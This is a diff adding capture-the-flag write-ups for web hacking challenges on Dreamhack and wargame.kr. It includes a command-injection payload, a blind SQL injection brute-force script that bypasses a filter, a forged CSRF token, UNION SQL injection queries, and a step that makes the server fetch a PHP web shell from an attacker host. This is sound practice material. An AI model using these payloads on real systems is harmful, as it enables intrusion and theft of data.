@@ -122,3 +122,124 @@ Submit the second payload to get the second part of the flag:
 ```sql
 admin' AND extractvalue(1, concat(0x7e, substring((SELECT upw FROM user WHERE uid='admin'), 20), 0x7e)) AND '1'='1
 ```
+
+## command-injection-chatgpt
+
+Submit the payload:
+
+```
+0.0.0.0; cat ./flag.py
+```
+
+## sql injection bypass WAF
+
+Blind SQL Injection can be used in this challenge:
+
+```python
+import requests
+import string
+import urllib.parse
+
+
+charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
+target_url = "http://host3.dreamhack.games:15683/?uid="
+received_flag_content = ""
+
+for i in range(4, 44):
+    for char in charset:
+        res = requests.get(f"{target_url}{urllib.parse.quote_plus(f"'||uid=CHAR(97,100,109,105,110)&&SUBSTRING(upw,{i},1)='{char}")}")
+        print(f"Tried {received_flag_content}{char}")
+        print(f"{target_url}{urllib.parse.quote_plus(f"'||uid=CHAR(97,100,109,105,110)&&SUBSTRING(upw,{i},1)='{char}")}")
+
+        if "admin" in res.text:
+            received_flag_content += char
+            print(f'GOT {received_flag_content}')
+            print()
+            break
+
+print(f"Flag content {received_flag_content}")
+```
+
+## CSRF Advanced
+
+This is the updated challenge with CSRF check however we can take the CSRF by this:
+
+```python
+from hashlib import md5
+
+print(md5(("admin" + "127.0.0.1").encode()).hexdigest())
+```
+
+Submit payload in `/flag`:
+
+```
+<img src="/change_password?pw=1234&csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb">
+```
+
+Login as `admin:1234` to get the flag.
+
+## baby-union
+
+Submit payload in `uid` to get tables:
+
+```
+' UNION SELECT table_name, 2, 3, 4 FROM information_schema.tables #
+```
+
+Found `onlyflag` table. Use payload to get list of columns:
+
+```
+' UNION SELECT column_name, 2, 3, 4 FROM information_schema.COLUMNS WHERE table_name = 'onlyflag' #
+```
+
+Final payload to get the flag:
+
+```
+' UNION SELECT sname, svalue, sflag, sclose FROM onlyflag #
+```
+
+However because the third column is hidden which is the `sflag` so reposition it to see the `sflag` value (which is the middle part of the flag):
+
+```
+' UNION SELECT sname, svalue, sclose, sflag FROM onlyflag #
+```
+
+## Command Injection Advanced
+
+Host a public file `pwn.txt`:
+
+```txt
+<?php
+// Since /flag is 111 (execute only), we must run it, not read it.
+system('/flag');
+?>
+```
+
+Submit payload:
+
+```
+http://<ATTACKER_IP>/pwn.txt -o cache/shell.php
+```
+
+Then visit to get the flag:
+
+```
+http://host8.dreamhack.games:23798/cache/shell.php
+```
+
+## [wargame.kr] login filtering
+
+Login as:
+
+```
+Username: Guest
+Password: guest
+```
+
+## [wargame.kr] strcmp
+
+Use Browser Console to change the input:
+
+```html
+<input type="text" name="password[]" value="123" />
+```
